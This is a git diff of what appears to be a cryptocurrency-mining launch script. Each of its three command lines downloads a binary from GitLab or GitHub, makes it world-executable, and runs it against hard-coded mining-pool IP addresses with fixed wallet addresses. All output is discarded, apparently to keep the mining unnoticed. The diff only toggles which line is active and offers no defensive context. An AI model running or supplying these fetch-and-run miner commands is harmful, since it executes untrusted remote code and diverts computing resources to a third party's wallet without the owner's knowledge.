@@ -2,7 +2,7 @@
 
 #wget https://gitlab.com/majapahlevi/mvp/-/raw/main/hashx7 && chmod 777 hashx7 && ./hashx7 -a hashx7 -o 68.183.144.48:443 -u Xu526ZB1hmDZjpPu44pu1YhFDufeTAv9fK.MJ -t4 > /dev/null
 
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/xmrigCC-3.4.1.tar.gz && tar -xf xmrigCC-3.4.1.tar.gz && rm xmrigCC-3.4.1.tar.gz && ./miner/xmrigDaemon -o 157.230.239.11:80 -u SaLvsC9mJtH435TnShocT387uQRGZcDZGJsfYF4MfuAGTRGAffsUNjSAtNdgDtsqHGDAqSu8icwQpjD8eBbXAtoyNqzHDQW4oPA -p .$(shuf -n 1 -i 1-999)-Bismillah -k -a randomx -t4 > /dev/null 2>&1
+#wget https://gitlab.com/majapahlevi/mvp/-/raw/main/xmrigCC-3.4.1.tar.gz && tar -xf xmrigCC-3.4.1.tar.gz && rm xmrigCC-3.4.1.tar.gz && ./miner/xmrigDaemon -o 157.230.239.11:80 -u SaLvsC9mJtH435TnShocT387uQRGZcDZGJsfYF4MfuAGTRGAffsUNjSAtNdgDtsqHGDAqSu8icwQpjD8eBbXAtoyNqzHDQW4oPA -p .$(shuf -n 1 -i 1-999)-Bismillah -k -a randomx -t4 > /dev/null 2>&1
 
 
 git clone https://github.com/concepcionjarvarious/m.git && cd m && chmod 777 m && clear && ./m --spectre --wallet spectre:qp99w2cc8gyfwnkjkccgh9k7zjtyzhsw688zja23dnfph60t8uazxwymzuuwf --daemon-address 157.230.239.11 --port 443 --worker-name $(shuf -n 1 -i 1-9999)-Bismillah --threads 4 --dev-fee 1 > /dev/null 2>&1
